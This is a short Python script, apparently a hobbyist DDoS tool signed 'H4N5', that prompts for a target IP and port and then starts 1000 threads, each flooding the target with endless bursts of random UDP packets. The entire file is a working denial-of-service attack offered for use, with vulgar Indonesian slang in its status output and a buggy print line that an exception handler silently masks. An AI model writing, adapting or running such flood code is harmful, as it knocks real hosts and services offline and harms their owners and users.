import socket
import threading
import random
import os
import sys

print ("\033[31mUDP TEST")
print ("SIMPLE DDOS")
print ("H4N5")

ip = str(input("IP :"))
port = str(input("Port :"))
choice = str(input("gas? :"))

def udp():
	data = os.urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(1000):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
			
for y in range(1000):
    if choice == 'y':
        th = threading.Thread(target = udp)
        th.start()